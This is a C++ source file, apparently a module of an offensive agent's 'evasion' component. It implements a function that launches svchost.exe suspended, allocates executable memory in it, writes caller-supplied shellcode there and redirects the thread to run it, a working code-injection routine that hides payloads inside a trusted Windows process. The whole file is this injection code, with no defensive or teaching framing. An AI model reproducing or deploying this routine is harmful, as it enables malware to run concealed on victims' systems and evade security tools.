#include "agent/modules/evasion/process_hollowing.hpp"
#include <windows.h>
#include <cstdio>
#include <winternl.h>

// Definitions for NtUnmapViewOfSection
typedef NTSTATUS (WINAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);

bool ProcessHollowing::InjectIntoSvchost(const void* shellcode, size_t size) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // Create suspended process
    if(!CreateProcessW(L"C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, 
                      CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    // Allocate memory in target
    void* remoteMem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Write shellcode
    SIZE_T bytesWritten;
    if(!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, size, &bytesWritten)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if(GetThreadContext(pi.hThread, &ctx)) {
#ifdef _WIN64
        ctx.Rcx = (DWORD64)remoteMem; 
#else
        ctx.Eax = (DWORD)remoteMem;
#endif
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
        
        // BUG FIXED: Handles must be closed even after successful injection
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }
    
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return false;
}